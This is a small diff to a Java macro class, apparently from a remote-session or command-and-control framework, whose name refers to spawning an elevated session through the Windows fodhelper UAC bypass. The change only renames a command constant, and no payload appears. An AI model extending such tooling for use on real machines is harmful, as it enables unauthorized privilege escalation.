@@ -22,7 +22,7 @@ public class SpawnFodhelperElevatedSessionMacro extends AbstractCommandMacro {
 	@Override
 	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
 		MacroOutcome outcome = new MacroOutcome();
-		sendCommand(Commands.CLIENT_GET_EXE_CMD, sessionId, outcome);
+		sendCommand(Commands.CLIENT_CMD_GET_EXE, sessionId, outcome);
 		String clientCmd = awaitResponse(sessionId, outcome);
 		clientCmd = clientCmd.replace("\r", "");
 		clientCmd = clientCmd.replace("\n", "");
